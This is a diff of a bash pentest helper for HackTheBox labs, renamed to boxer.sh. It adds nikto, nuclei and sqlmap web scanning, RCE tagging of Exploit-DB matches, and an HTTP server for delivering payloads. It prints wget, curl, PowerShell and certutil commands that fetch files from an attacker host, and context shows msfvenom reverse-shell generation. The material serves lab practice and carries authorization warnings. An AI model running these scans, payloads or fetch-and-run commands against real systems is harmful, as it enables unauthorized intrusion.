@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 #
-# htb-setup.sh — HackTheBox host environment helper for Ubuntu/Debian
+# boxer.sh — HackTheBox host environment helper for Ubuntu/Debian
 #
 # A single script with subcommands for:
 #   install    Install a core pentest toolset (apt + git + pipx)
@@ -14,13 +14,13 @@
 # e.g. HackTheBox lab targets, or systems you own. Unauthorized scanning is illegal.
 #
 # Usage:
-#   ./htb-setup.sh install
-#   ./htb-setup.sh tools                       # reads $TOOLS_LIST (default ~/htb/tools.txt)
-#   ./htb-setup.sh tools <git-url> [git-url…]  # or pass URLs inline
-#   ./htb-setup.sh workspace [box-name] [target-ip]   # prompts if omitted
-#   ./htb-setup.sh recon <target-ip> [box-name]
-#   ./htb-setup.sh vpn /path/to/lab.ovpn
-#   ./htb-setup.sh doctor
+#   ./boxer.sh install
+#   ./boxer.sh tools                       # reads $TOOLS_LIST (default ~/htb/tools.txt)
+#   ./boxer.sh tools <git-url> [git-url…]  # or pass URLs inline
+#   ./boxer.sh workspace [box-name] [target-ip]   # prompts if omitted
+#   ./boxer.sh recon <target-ip> [box-name]
+#   ./boxer.sh vpn /path/to/lab.ovpn
+#   ./boxer.sh doctor
 #
 set -euo pipefail
 
@@ -37,7 +37,7 @@ WORDLIST_ROCKYOU="/usr/share/wordlists/rockyou.txt"
 # apt packages available in the standard Ubuntu/Debian repos
 APT_PACKAGES=(
   nmap netcat-openbsd ncat socat curl wget git jq dnsutils whois
-  gobuster ffuf nikto sqlmap hydra john hashcat masscan
+  gobuster ffuf nikto sqlmap nuclei hydra john hashcat masscan
   smbclient enum4linux ldap-utils snmp onesixtyone
   python3 python3-pip python3-venv pipx
   ruby-full openvpn openssl proxychains4 tmux xxd inotify-tools exploitdb
@@ -67,6 +67,14 @@ need_root() {
 }
 
 have() { command -v "$1" >/dev/null 2>&1; }
+
+# True if $1 is valid IPv4 CIDR (e.g. 10.129.92.12/32): 4 octets 0-255 + /0-32.
+is_cidr() {
+  [[ "$1" =~ ^([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})/([0-9]|[1-2][0-9]|3[0-2])$ ]] || return 1
+  local o
+  for o in "${BASH_REMATCH[@]:1:4}"; do (( o <= 255 )) || return 1; done
+  return 0
+}
 
 # Add "<ip>  <hostname>" to /etc/hosts, updating any stale entry for that host.
 add_hosts_entry() {
@@ -160,21 +168,21 @@ cmd_install() {
     c_info "Found tool list at $TOOLS_LIST — installing Git tools..."
     cmd_tools || c_warn "some Git tools failed; see output above"
   else
-    c_info "No $TOOLS_LIST found; skipping Git tools. (Create it or run './htb-setup.sh tools <url>'.)"
+    c_info "No $TOOLS_LIST found; skipping Git tools. (Create it or run './boxer.sh tools <url>'.)"
   fi
 
   # Fetch precompiled winPEAS/linPEAS binaries (not in the git repo) for delivery.
   c_info "Fetching precompiled PEASS binaries (winPEAS/linPEAS)..."
-  cmd_peass || c_warn "PEASS binary fetch failed; run './htb-setup.sh peass' later"
+  cmd_peass || c_warn "PEASS binary fetch failed; run './boxer.sh peass' later"
 
-  c_ok "Install phase complete. Run './htb-setup.sh doctor' to verify."
+  c_ok "Install phase complete. Run './boxer.sh doctor' to verify."
 }
 
 # ---------------------------------------------------------------------------
 # doctor — verify tooling
 # ---------------------------------------------------------------------------
 cmd_doctor() {
-  local tools=(nmap ffuf gobuster nikto sqlmap hydra john hashcat \
+  local tools=(nmap ffuf gobuster nikto sqlmap nuclei hydra john hashcat \
                smbclient nc curl python3 pipx openvpn proxychains4 tmux jq searchsploit msfvenom)
   local missing=0
   c_info "Checking installed tools..."
@@ -184,7 +192,7 @@ cmd_doctor() {
   [[ -d "$SECLISTS_DIR" ]] && c_ok "SecLists present" || c_warn "SecLists missing"
   [[ -f "$WORDLIST_ROCKYOU" ]] && c_ok "rockyou.txt present" || c_warn "rockyou.txt missing"
   if [[ $missing -eq 0 ]]; then c_ok "All core tools present."; else
-    c_warn "$missing tool(s) missing — re-run './htb-setup.sh install'."
+    c_warn "$missing tool(s) missing — re-run './boxer.sh install'."
   fi
 }
 
@@ -254,7 +262,7 @@ install_one_repo() {
 }
 
 cmd_tools() {
-  if ! have git; then c_err "git not installed. Run './htb-setup.sh install'."; exit 1; fi
+  if ! have git; then c_err "git not installed. Run './boxer.sh install'."; exit 1; fi
   mkdir -p "$TOOLS_DIR"
 
   local urls=()
@@ -293,15 +301,15 @@ cmd_peass() {
   if [[ ${#wanted[@]} -eq 0 ]]; then
     wanted=(winPEASx64.exe winPEASx86.exe winPEASany.exe winPEAS.bat linpeas.sh linpeas_small.sh)
   fi
-  if ! have python3; then c_err "python3 required. Run './htb-setup.sh install'."; return 0; fi
+  if ! have python3; then c_err "python3 required. Run './boxer.sh install'."; return 0; fi
   if ! have curl && ! have wget; then c_err "curl or wget required."; return 0; fi
 
   mkdir -p "$dest"
   local api="https://api.github.com/repos/peass-ng/PEASS-ng/releases/latest"
   c_info "Querying latest PEASS-ng release..."
   local json
-  if have curl; then json="$(curl -fsSL -A "htb-setup" "$api" 2>/dev/null || true)"
-  else json="$(wget -qO- --header='User-Agent: htb-setup' "$api" 2>/dev/null || true)"; fi
+  if have curl; then json="$(curl -fsSL -A "boxer" "$api" 2>/dev/null || true)"
+  else json="$(wget -qO- --header='User-Agent: boxer' "$api" 2>/dev/null || true)"; fi
   if [[ -z "$json" ]]; then c_warn "Could not reach GitHub API — check connectivity."; return 0; fi
 
   # Extract "name<TAB>url" for the assets we want.
@@ -335,7 +343,7 @@ for a in data.get("assets", []):
   done <<< "$pairs"
 
   c_ok "PEASS binaries ready in: $dest  ($got file(s))"
-  c_info "Deliver them with:  ./htb-setup.sh ftp $dest   (then pull winPEASx64.exe / linpeas.sh from the box)"
+  c_info "Deliver them with:  ./boxer.sh ftp $dest   (then pull winPEASx64.exe / linpeas.sh from the box)"
   return 0
 }
 
@@ -354,14 +362,18 @@ cmd_workspace() {
   box="$(echo "$box" | tr '/' '-' | awk '{$1=$1};1' | tr ' ' '-')"
   if [[ -z "$box" ]]; then c_err "A box name is required."; exit 1; fi
 
-  # Prompt for the box IP if it wasn't provided on the command line.
+  # Require the target in CIDR notation — AutoRecon needs it (a bare IP fails).
+  # For a single host, append /32 (e.g. 10.129.92.12/32).
   if [[ -z "$ip" ]]; then
-    read -r -p "$(printf '\033[1;34m[?]\033[0m Enter the box IP address: ')" ip
+    read -r -p "$(printf '\033[1;34m[?]\033[0m Enter the box IP in CIDR notation (e.g. 10.129.92.12/32): ')" ip
   fi
-  # Basic IPv4 sanity check (non-fatal — allows hostnames too, just warns).
-  if [[ ! "$ip" =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
-    c_warn "'$ip' doesn't look like an IPv4 address; continuing anyway."
-  fi
+  while ! is_cidr "$ip"; do
+    [[ -n "$ip" ]] && c_warn "'$ip' is not valid CIDR. AutoRecon requires it — append /32 for a single host (e.g. 10.129.92.12/32)."
+    read -r -p "$(printf '\033[1;34m[?]\033[0m Box IP in CIDR (e.g. 10.129.92.12/32): ')" ip \
+      || { c_err "IP must be in CIDR notation (e.g. 10.129.92.12/32)."; exit 1; }
+  done
+  local ip_cidr="$ip"     # full CIDR — passed to AutoRecon
+  ip="${ip%/*}"           # plain IP — used for /etc/hosts, URLs, notes, nmap
 
   # Add the box to /etc/hosts as <ip> <box>.htb so vhosts resolve.
   add_hosts_entry "$ip" "${box}.htb"
@@ -376,6 +388,7 @@ cmd_workspace() {
 # ${box}
 
 - Target IP: ${ip}
+- AutoRecon target (CIDR): ${ip_cidr}
 - Date started: $(date +%Y-%m-%d)
 
 ## Ports / Services
@@ -409,20 +422,20 @@ EOF
   cat > "$dir/run-recon.sh" <<EOF
 #!/usr/bin/env bash
 # Convenience wrapper: recon this box.
-exec "$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)/htb-setup.sh" recon "${ip}" "${box}" 2>/dev/null || \\
-exec htb-setup.sh recon "${ip}" "${box}"
+exec "$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)/boxer.sh" recon "${ip}" "${box}" 2>/dev/null || \\
+exec boxer.sh recon "${ip}" "${box}"
 EOF
   chmod +x "$dir/run-recon.sh" 2>/dev/null || true
 
   c_info "Workspace ready. cd ${dir}  (host: ${box}.htb -> ${ip})"
 
-  # Offer to kick off AutoRecon against the box right away.
-  if [[ -n "$ip" ]]; then
+  # Offer to kick off AutoRecon against the box right away (uses the CIDR target).
+  if [[ -n "$ip_cidr" ]]; then
     local ans
-    read -r -p "$(printf '\033[1;34m[?]\033[0m Run AutoRecon against %s now? [y/N]: ' "$ip")" ans
+    read -r -p "$(printf '\033[1;34m[?]\033[0m Run AutoRecon against %s now? [y/N]: ' "$ip_cidr")" ans
     case "${ans,,}" in
-      y|yes) run_autorecon "$ip" "$dir" ;;
-      *) c_info "Skipping AutoRecon. Run it later with:  ./htb-setup.sh recon ${ip} ${box}" ;;
+      y|yes) run_autorecon "$ip" "$dir" "$ip_cidr" ;;
+      *) c_info "Skipping AutoRecon. Run it later with:  ./boxer.sh recon ${ip} ${box}" ;;
     esac
   fi
 }
@@ -546,7 +559,9 @@ EOF
 # run_autorecon — launch AutoRecon against a target, output into workspace
 # ---------------------------------------------------------------------------
 run_autorecon() {
-  local ip="$1" dir="${2:-$PWD}"
+  # $1 = plain IP (used for web/secrets/URLs); $3 = AutoRecon target in CIDR
+  # (falls back to the plain IP if not supplied).
+  local ip="$1" dir="${2:-$PWD}" ar_target="${3:-$1}"
   # Locate the autorecon binary (pipx install) or the cloned repo entrypoint.
   local ar=""
   if have autorecon; then
@@ -558,7 +573,7 @@ run_autorecon() {
   fi
 
   if [[ -z "$ar" ]]; then
-    c_warn "AutoRecon not found. Install it first:  ./htb-setup.sh install   (or  ./htb-setup.sh tools https://github.com/Tib3rius/AutoRecon )"
+    c_warn "AutoRecon not found. Install it first:  ./boxer.sh install   (or  ./boxer.sh tools https://github.com/Tib3rius/AutoRecon )"
     c_info "Falling back to built-in recon..."
     cmd_recon "$ip" "$(basename "$dir")"
     return 0
@@ -569,13 +584,14 @@ run_autorecon() {
   local box_host; box_host="$(basename "$dir").htb"
   local web_report="$dir/web-attack-surface.txt"
   c_warn "Only scan hosts you are authorized to test (HTB labs / your own systems)."
-  c_info "Launching AutoRecon -> output in $out  (this can take a while)"
+  c_info "Launching AutoRecon against ${ar_target} -> output in $out  (this can take a while)"
 
   # Start AutoRecon in the background so the web analyzer can run alongside it.
+  # AutoRecon is given the CIDR target ($ar_target); web/secrets use the plain IP.
   if [[ $EUID -ne 0 ]] && have sudo; then
-    ( sudo $ar -o "$out" "$ip" ) &
+    ( sudo $ar -o "$out" "$ar_target" ) &
   else
-    ( $ar -o "$out" "$ip" ) &
+    ( $ar -o "$out" "$ar_target" ) &
   fi
   local ar_pid=$!
 
@@ -613,7 +629,7 @@ run_autorecon() {
 cmd_recon() {
   local ip="${1:-}"; local box="${2:-target}"
   if [[ -z "$ip" ]]; then c_err "Usage: $0 recon <target-ip> [box-name]"; exit 1; fi
-  if ! have nmap; then c_err "nmap not installed. Run './htb-setup.sh install'."; exit 1; fi
+  if ! have nmap; then c_err "nmap not installed. Run './boxer.sh install'."; exit 1; fi
 
   local out="${HTB_ROOT}/${box}/nmap"
   mkdir -p "$out"
@@ -672,7 +688,7 @@ cmd_recon() {
 cmd_websurface() {
   local ip="${1:-}"; local box="${2:-target}"
   if [[ -z "$ip" ]]; then c_err "Usage: $0 websurface <target-ip> [box-name]"; exit 1; fi
-  if ! have curl; then c_err "curl not installed. Run './htb-setup.sh install'."; exit 1; fi
+  if ! have curl; then c_err "curl not installed. Run './boxer.sh install'."; exit 1; fi
   local dir="${HTB_ROOT}/${box}"; mkdir -p "$dir"
   # No PID to follow -> the watcher self-caps; also harvest any existing autorecon output.
   web_surface_watch "$ip" "$dir/autorecon" "$dir/web-attack-surface.txt" "" "${box}.htb"
@@ -688,7 +704,7 @@ cmd_websurface() {
 cmd_secrets() {
   local ip="${1:-}"; local box="${2:-target}"
   if [[ -z "$ip" ]]; then c_err "Usage: $0 secrets <target-ip-or-host> [box-name]"; exit 1; fi
-  if ! have python3; then c_err "python3 not installed. Run './htb-setup.sh install'."; exit 1; fi
+  if ! have python3; then c_err "python3 not installed. Run './boxer.sh install'."; exit 1; fi
 
   local dir="${HTB_ROOT}/${box}"; mkdir -p "$dir"
   local out="$dir/secrets-report.txt"
@@ -891,7 +907,7 @@ cmd_exploits() {
   local dir="${HTB_ROOT}/${box}"
   if ! have searchsploit; then
     c_warn "searchsploit (exploitdb) not installed — skipping exploit lookup."
-    c_info "Install it:  sudo apt install exploitdb   (or re-run './htb-setup.sh install')"
+    c_info "Install it:  sudo apt install exploitdb   (or re-run './boxer.sh install')"
     return 0
   fi
   if ! have python3; then c_warn "python3 missing — skipping exploit lookup."; return 0; fi
@@ -965,9 +981,14 @@ def build_queries(product, version):
             seen.add(q.lower()); uniq.append(q)
     return uniq
 
+# Title keywords that indicate remote code / command execution (highest priority leads).
+RCE_RE = re.compile(r"(?i)\b(rce|remote code execution|command execution|command injection|"
+                    r"unauthenticated|arbitrary (code|command)|code exec)\b")
+
 report_blocks = []
 alert_lines = []
 total = 0
+rce_total = 0
 
 for (portid, proto, product, version), name in sorted(services.items(), key=lambda k: int(k[0][0]) if k[0][0].isdigit() else 0):
     hits, seen_ids = [], set()
@@ -983,9 +1004,14 @@ for (portid, proto, product, version), name in sorted(services.items(), key=lamb
     label = f"{portid}/{proto}  {product} {version}".rstrip() + (f"  ({name})" if name else "")
     if hits:
         total += len(hits)
+        # Sort RCE-looking exploits to the top of each service block.
+        hits.sort(key=lambda h: 0 if RCE_RE.search(h[1]) else 1)
         block = [f"=== {label} ===  {len(hits)} exploit(s)"]
         for eid, title, path in hits[:25]:
-            block.append(f"   EDB-{eid}: {title}")
+            tag = "  [RCE?]" if RCE_RE.search(title) else ""
+            if tag:
+                rce_total += 1
+            block.append(f"   EDB-{eid}: {title}{tag}")
             block.append(f"      view: searchsploit -x {eid}   copy: searchsploit -m {eid}")
         report_blocks.append("\n".join(block))
         alert_lines.append(f"{label}: {len(hits)} known exploit(s) (e.g. EDB-{hits[0][0]}: {hits[0][1][:70]})")
@@ -994,21 +1020,147 @@ for (portid, proto, product, version), name in sorted(services.items(), key=lamb
 
 with open(outfile, "w", encoding="utf-8") as fo:
     fo.write("# Exploit matches for fingerprinted services (offline Exploit-DB / searchsploit)\n")
-    fo.write(f"# Services analysed: {len(services)}   Total exploit matches: {total}\n")
-    fo.write("# Verify each: version match ≠ vulnerable. Use 'searchsploit -x <EDB-ID>' to read the exploit.\n\n")
+    fo.write(f"# Services analysed: {len(services)}   Total matches: {total}   Possible RCE: {rce_total}\n")
+    fo.write("#\n")
+    fo.write("# [RCE?] tags flag titles that mention remote code/command execution — the\n")
+    fo.write("# highest-value leads, but a version match is NOT proof of vulnerability.\n")
+    fo.write("# Workflow (keep yourself in the loop — never run an exploit unread):\n")
+    fo.write("#   1) READ it:     searchsploit -x <EDB-ID>\n")
+    fo.write("#   2) COPY it:     searchsploit -m <EDB-ID>   (lands in your cwd)\n")
+    fo.write("#   3) VALIDATE safely: if a Metasploit module exists, its 'check' command tests\n")
+    fo.write("#      whether the target is vulnerable WITHOUT exploiting it:\n")
+    fo.write("#        msfconsole -q -x \"search <product>; use <module>; set RHOSTS <ip>; check\"\n\n")
     fo.write("\n\n".join(report_blocks) if report_blocks else "No fingerprinted services with a product/version found.\n")
 
 def cprint(color, msg): sys.stderr.write(f"\033[{color}m{msg}\033[0m\n")
 if total:
-    cprint("1;31", f"[!] {total} known exploit match(es) across {len(services)} fingerprinted service(s):")
+    cprint("1;31", f"[!] {total} known exploit match(es) across {len(services)} service(s)"
+                   + (f"; {rce_total} look like RCE" if rce_total else "") + ":")
     for line in alert_lines:
         if "known exploit" in line:
             sys.stderr.write(f"    - {line}\n")
+    sys.stderr.write("    Review before running: 'searchsploit -x <id>'. For a safe vuln test, use a Metasploit module's 'check'.\n")
 else:
     sys.stderr.write("[*] No known Exploit-DB matches for the fingerprinted services.\n")
 PY
   local rc=$?
   if [[ $rc -eq 0 ]]; then c_ok "Exploit lookup complete -> $out"; else c_warn "Exploit lookup exited $rc (partial results may be in $out)"; fi
+  return 0
+}
+
+# ---------------------------------------------------------------------------
+# webscan — chain nikto + nuclei + sqlmap for web vulnerability scanning
+# ---------------------------------------------------------------------------
+# Covers the same ground as Burp Suite's active scanner (free, fully CLI).
+# nikto   : generic web server misconfigs, outdated software, dangerous files.
+# nuclei  : template-driven CVE + misconfiguration + exposure scanning.
+#           Uses -automatic-scan (wappalyzer tech detection) so it picks the
+#           right templates for the stack it detects (PHP, Apache, IIS, etc.).
+# sqlmap  : optional SQL-injection sweep (prompted — can be noisy).
+# Only run against authorized targets (HTB labs / your own systems).
+cmd_webscan() {
+  local target="${1:-}"; local box="${2:-target}"
+  if [[ -z "$target" ]]; then c_err "Usage: $0 webscan <target-ip-or-url> [box-name]"; exit 1; fi
+
+  local dir="${HTB_ROOT}/${box}"; mkdir -p "$dir"
+  local out="$dir/webscan"; mkdir -p "$out"
+
+  # Build a base URL if a bare IP/host was given.
+  local base_url
+  if [[ "$target" =~ ^https?:// ]]; then
+    base_url="$target"
+  else
+    base_url="http://${target}"
+  fi
+
+  c_warn "Only scan systems you are authorized to test (HTB labs / your own systems)."
+  c_info "Web vulnerability scan: $base_url  ->  $out"
+  echo
+
+  # ------------------------------------------------------------------
+  # 1) nikto — fast web-server audit (misconfigs, headers, known bugs)
+  # ------------------------------------------------------------------
+  if have nikto; then
+    c_info "▶ Stage 1: nikto web-server scan..."
+    nikto -host "$base_url" -output "$out/nikto.txt" -Format txt 2>&1 | tee "$out/nikto-live.txt" || true
+    c_ok "nikto -> $out/nikto.txt"
+    # Show any critical-sounding hits inline.
+    grep -iE '(OSVDB|CVE|XSS|SQL|traversal|upload|backdoor|admin|config|cgi)' "$out/nikto.txt" 2>/dev/null \
+      | head -20 | while IFS= read -r l; do c_warn "$l"; done || true
+  else
+    c_warn "nikto not installed — skipping. (Run './boxer.sh install' or 'sudo apt install nikto')"
+  fi
+  echo
+
+  # ------------------------------------------------------------------
+  # 2) nuclei — template-driven CVE / misconfiguration / exposure scan
+  # ------------------------------------------------------------------
+  if have nuclei; then
+    c_info "▶ Stage 2: nuclei automatic scan (wappalyzer tech-detect + matched templates)..."
+    c_info "  First run auto-downloads templates (~100 MB) — may take a moment."
+    # -automatic-scan: detects tech via wappalyzer, selects relevant templates.
+    # -severity: only alert on medium/high/critical to cut noise.
+    # -silent:   suppresses banner; raw findings go to -o.
+    nuclei -u "$base_url" \
+           -automatic-scan \
+           -severity medium,high,critical \
+           -o "$out/nuclei.txt" \
+           -silent 2>/dev/null || \
+    # Fallback: if -automatic-scan not supported (older nuclei), use tag filter.
+    nuclei -u "$base_url" \
+           -tags cve,rce,sqli,xss,lfi,ssrf,exposure,misconfig \
+           -severity medium,high,critical \
+           -o "$out/nuclei.txt" \
+           -silent 2>/dev/null || true
+    if [[ -s "$out/nuclei.txt" ]]; then
+      local nc; nc=$(wc -l < "$out/nuclei.txt" | tr -d ' ')
+      c_ok "nuclei -> $out/nuclei.txt  ($nc finding(s))"
+      head -25 "$out/nuclei.txt"
+    else
+      c_info "nuclei: no medium/high/critical findings on $base_url."
+    fi
+  else
+    c_warn "nuclei not installed — skipping."
+    c_info "Install: sudo apt install nuclei"
+    c_info "  OR:    go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
+    c_info "  (nuclei is available in ParrotOS/Kali repos; may need 'sudo apt update' first)"
+  fi
+  echo
+
+  # ------------------------------------------------------------------
+  # 3) sqlmap — SQL injection sweep (optional, user-prompted)
+  # ------------------------------------------------------------------
+  local sqsel
+  ask sqsel "Run sqlmap against $base_url? (crawls for SQLi — can be noisy) [y/N]: "
+  if [[ "${sqsel:-n}" =~ ^[Yy] ]]; then
+    if have sqlmap; then
+      c_info "▶ Stage 3: sqlmap SQL-injection sweep (crawl=3, level=2, risk=1, batch)..."
+      mkdir -p "$out/sqlmap"
+      sqlmap -u "$base_url" \
+             --crawl=3 \
+             --batch \
+             --level=2 \
+             --risk=1 \
+             --output-dir="$out/sqlmap" \
+             2>&1 | tee "$out/sqlmap-live.txt" || true
+      c_ok "sqlmap -> $out/sqlmap/"
+      # Surface any injectable parameters found.
+      grep -iE '(injectable|VULNERABLE|payload)' "$out/sqlmap-live.txt" 2>/dev/null \
+        | head -15 | while IFS= read -r l; do c_warn "$l"; done || true
+    else
+      c_warn "sqlmap not installed — skipping. (Run './boxer.sh install' or 'sudo apt install sqlmap')"
+    fi
+  fi
+  echo
+
+  # ------------------------------------------------------------------
+  # Summary
+  # ------------------------------------------------------------------
+  c_ok "Web scan complete. Results in: $out"
+  have nikto   && c_info "  nikto:  $out/nikto.txt"
+  have nuclei  && c_info "  nuclei: $out/nuclei.txt"
+  [[ "${sqsel:-n}" =~ ^[Yy] ]] && c_info "  sqlmap: $out/sqlmap/"
+  c_info "Tip: combine with './boxer.sh secrets $target $box' to also hunt for leaked creds/tokens."
   return 0
 }
 
@@ -1028,7 +1180,7 @@ find_roothound() {
 run_roothound_on() {
   local infile="$1" dir="$2"
   local rh; rh="$(find_roothound)" || {
-    c_err "RootHound not found. Install it:  ./htb-setup.sh tools https://github.com/Noz2/RootHound"
+    c_err "RootHound not found. Install it:  ./boxer.sh tools https://github.com/Noz2/RootHound"
     return 1
   }
   [[ -s "$infile" ]] || { c_warn "linPEAS file empty/missing: $infile"; return 1; }
@@ -1063,8 +1215,8 @@ roothound_handle_file() {
 }
 
 cmd_roothound() {
-  if ! have python3; then c_err "python3 not installed. Run './htb-setup.sh install'."; exit 1; fi
-  find_roothound >/dev/null || { c_err "RootHound missing. Run:  ./htb-setup.sh tools https://github.com/Noz2/RootHound"; exit 1; }
+  if ! have python3; then c_err "python3 not installed. Run './boxer.sh install'."; exit 1; fi
+  find_roothound >/dev/null || { c_err "RootHound missing. Run:  ./boxer.sh tools https://github.com/Noz2/RootHound"; exit 1; }
 
   local arg1="${1:-}"; local given="${2:-}"
 
@@ -1122,6 +1274,79 @@ cmd_roothound() {
 }
 
 # ---------------------------------------------------------------------------
+# resolve_bind — turn a bind spec (auto|all|<iface>|<ip>) into IPs
+# ---------------------------------------------------------------------------
+# Prints "<bind_ip>\t<display_ip>". bind_ip empty => bind all interfaces.
+resolve_bind() {
+  local spec="$1" bind_ip="" disp=""
+  case "$spec" in
+    all|0.0.0.0) bind_ip="" ;;
+    auto)
+      bind_ip="$(ip -4 addr show tun0 2>/dev/null | grep -oP 'inet \K[0-9.]+' | head -n1 || true)"
+      [[ -z "$bind_ip" ]] && bind_ip="$(hostname -I 2>/dev/null | awk '{print $1}' || true)" ;;
+    *[0-9].[0-9]*.*.*) bind_ip="$spec" ;;
+    *) bind_ip="$(ip -4 addr show "$spec" 2>/dev/null | grep -oP 'inet \K[0-9.]+' | head -n1 || true)" ;;
+  esac
+  disp="$bind_ip"; [[ -z "$disp" ]] && disp="$(hostname -I 2>/dev/null | awk '{print $1}' || true)"
+  printf '%s\t%s\n' "$bind_ip" "$disp"
+}
+
+# ---------------------------------------------------------------------------
+# http — simple HTTP file server (use when the box blocks outbound FTP)
+# ---------------------------------------------------------------------------
+# Serves the delivery folder (default ~/htb/serve) over HTTP so a foothold shell
+# can pull tools with wget/curl/certutil/PowerShell. Same bind options as ftp.
+cmd_http() {
+  local dir="${1:-$HTB_ROOT/serve}"; local port="${2:-80}"
+  local bind_spec="${3:-${HTTP_BIND:-${FTP_BIND:-auto}}}"
+  if ! have python3; then c_err "python3 not installed. Run './boxer.sh install'."; exit 1; fi
+
+  mkdir -p "$dir"; dir="$(cd "$dir" && pwd)"
+
+  local res bind_ip atk
+  res="$(resolve_bind "$bind_spec")"; bind_ip="${res%%$'\t'*}"; atk="${res##*$'\t'}"
+  local addr bind_disp
+  if [[ "$bind_spec" == "all" || "$bind_spec" == "0.0.0.0" ]]; then
+    addr="0.0.0.0"; bind_disp="0.0.0.0 (all interfaces)"
+  elif [[ -n "$bind_ip" ]]; then
+    addr="$bind_ip"; bind_disp="$bind_ip"
+  else
+    addr="0.0.0.0"; bind_disp="0.0.0.0 (all interfaces)"
+    [[ "$bind_spec" == "auto" ]] && c_warn "auto: no tun0/host IP found — binding all interfaces." \
+                                 || c_warn "Could not resolve '$bind_spec' — binding all interfaces."
+  fi
+
+  local ifaces; ifaces="$(ip -4 -o addr show 2>/dev/null | awk '{print $2"="$4}' | paste -sd' ' - || true)"
+  c_warn "Only serve payloads to systems you are authorized to test, and stop it when done."
+  c_info "Available interfaces: ${ifaces:-none detected}"
+  c_info "Serving (HTTP): $dir"
+  c_info "URL base: http://${atk:-<ATTACKER-IP>}:$port/   Bind: ${bind_disp}:$port"
+  echo
+  c_info "Drop payloads/tools into: $dir, then from the box:"
+  cat <<EOF
+    # Linux target:
+    wget http://${atk:-<ATTACKER-IP>}:${port}/<file> -O /tmp/<file>
+    curl -o /tmp/<file> http://${atk:-<ATTACKER-IP>}:${port}/<file>
+
+    # Windows target (PowerShell):
+    (New-Object Net.WebClient).DownloadFile('http://${atk:-<ATTACKER-IP>}:${port}/<file>','C:\\Windows\\Temp\\<file>')
+    iwr http://${atk:-<ATTACKER-IP>}:${port}/<file> -OutFile C:\\Windows\\Temp\\<file>
+
+    # Windows target (certutil, no PowerShell needed):
+    certutil -urlcache -split -f http://${atk:-<ATTACKER-IP>}:${port}/<file> <file>
+EOF
+  echo
+  c_info "Starting HTTP server on ${addr}:${port} (Ctrl-C to stop)..."
+
+  local runner=(python3 -m http.server "$port" --bind "$addr" --directory "$dir")
+  if [[ "$port" -lt 1024 && $EUID -ne 0 ]] && have sudo; then
+    exec sudo "${runner[@]}"
+  else
+    exec "${runner[@]}"
+  fi
+}
+
+# ---------------------------------------------------------------------------
 # ftp — anonymous FTP server on the attacking host (tool delivery / pickup)
 # ---------------------------------------------------------------------------
 # Serves a directory over anonymous FTP so a foothold shell on the box can pull
@@ -1137,10 +1362,10 @@ cmd_roothound() {
 cmd_ftp() {
   local dir="${1:-$HTB_ROOT/serve}"; local port="${2:-21}"
   local bind_spec="${3:-${FTP_BIND:-auto}}"
-  if ! have python3; then c_err "python3 not installed. Run './htb-setup.sh install'."; exit 1; fi
+  if ! have python3; then c_err "python3 not installed. Run './boxer.sh install'."; exit 1; fi
   if ! python3 -c 'import pyftpdlib' >/dev/null 2>&1; then
     c_err "pyftpdlib not installed."
-    c_info "Install it:  pip3 install --break-system-packages pyftpdlib   (or './htb-setup.sh install')"
+    c_info "Install it:  pip3 install --break-system-packages pyftpdlib   (or './boxer.sh install')"
     exit 1
   fi
 
@@ -1285,7 +1510,7 @@ PS
   c_info "  Linux:   $dest/find-flags.sh"
   c_info "  Windows: $dest/find-flags.ps1"
   echo
-  c_info "Deliver them (e.g. ./htb-setup.sh ftp $dest), then run ON the box:"
+  c_info "Deliver them (e.g. ./boxer.sh ftp $dest), then run ON the box:"
   cat <<EOF
     # Linux target:
     wget ftp://<YOUR-IP>/find-flags.sh -O /tmp/ff.sh && bash /tmp/ff.sh
@@ -1382,7 +1607,7 @@ cmd_shell() {
       python)          fmttype=python;   kind=shell ;;
       python-met)      fmttype=python;   kind=meterpreter ;;
       bash)            fmttype=bash;     kind=shell ;;
-      *) c_err "Unknown payload type: '$type'"; c_info "Run './htb-setup.sh shell' for the picker."; return 0 ;;
+      *) c_err "Unknown payload type: '$type'"; c_info "Run './boxer.sh shell' for the picker."; return 0 ;;
     esac
   else
     # Step 1: choose the target / output format.
@@ -1468,7 +1693,7 @@ EOF
 
   if [[ "$lhost" == "<LHOST>" ]]; then
     c_warn "LHOST not detected (no tun0/host IP). Re-run with it explicitly:"
-    c_info "   ./htb-setup.sh shell $type <your-ip> $lport"
+    c_info "   ./boxer.sh shell $type <your-ip> $lport"
   elif have msfvenom; then
     c_info "Generating..."
     if msfvenom "${args[@]}"; then
@@ -1502,7 +1727,7 @@ EOF
   fi
 
   echo
-  c_info "Deliver it to the box, e.g.:  ./htb-setup.sh ftp $dest"
+  c_info "Deliver it to the box, e.g.:  ./boxer.sh ftp $dest"
   [[ "$veil_opt" == "1" ]] && c_info "You now have TWO payloads: ${base_noext}-msf.${ext} (plain) and ${base_noext}-veil.exe (obfuscated)."
   return 0
 }
@@ -1513,7 +1738,7 @@ EOF
 cmd_vpn() {
   local ovpn="${1:-}"
   if [[ -z "$ovpn" || ! -f "$ovpn" ]]; then c_err "Usage: $0 vpn /path/to/lab.ovpn"; exit 1; fi
-  if ! have openvpn; then c_err "openvpn not installed. Run './htb-setup.sh install'."; exit 1; fi
+  if ! have openvpn; then c_err "openvpn not installed. Run './boxer.sh install'."; exit 1; fi
   need_root
   c_info "Connecting to HTB VPN via $ovpn (Ctrl-C to disconnect)..."
   c_info "Your HTB tun IP will appear once connected; check with: ip a show tun0"
@@ -1531,29 +1756,40 @@ ask() { local __v="$1"; shift; read -r -p "$(printf '\033[1;34m[?]\033[0m %s' "$
 # menu — interactive "what next?" guide (default when run with no arguments)
 # ---------------------------------------------------------------------------
 cmd_menu() {
+  # Boxer wordmark (green), shown once on entry.
+  printf '\033[1;32m\n'
+  cat <<'EOF'
+ ____
+| __ )  _____  _____ _ __
+|  _ \ / _ \ \/ / _ \ '__|
+| |_) | (_) >  <  __/ |
+|____/ \___/_/\_\___|_|
+EOF
+  printf '\033[0m'
   while true; do
-    printf '\n\033[1;36m==== htb-setup — what would you like to do? ====\033[0m\n'
+    printf '\n\033[1;36m==== boxer — what would you like to do? ====\033[0m\n'
     cat <<'EOF'
   Setup
